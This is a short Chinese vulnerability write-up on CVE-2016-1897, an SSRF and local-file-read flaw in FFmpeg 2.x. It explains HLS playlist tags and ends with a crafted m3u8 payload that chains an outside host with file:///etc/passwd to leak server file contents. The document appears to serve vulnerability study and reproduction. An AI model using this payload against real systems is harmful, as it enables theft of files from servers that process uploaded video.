---
title: "（CVE-2016-1897）Ffmpeg ssrf"
id: zhfly2938
---

# （CVE-2016-1897）Ffmpeg ssrf

## 一、漏洞简介

CVE-2016-1897只能读取文件的第一行

*   #EXTM3U 标签是m3u8的文件头，开头必须要这一行
*   #EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒
*   #EXT-X-VERSION:2 该标签可有可无
*   #EXTINF:6, 表示该一段TS流文件的长度
*   #EXT-X-ENDLIST 这个相当于文件结束符

## 二、漏洞影响

FFmpeg 2.x

## 三、复现过程

FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(https://www.0-sec.org/ffmpeg-protocols.html#concat )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://dx.su/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST 
```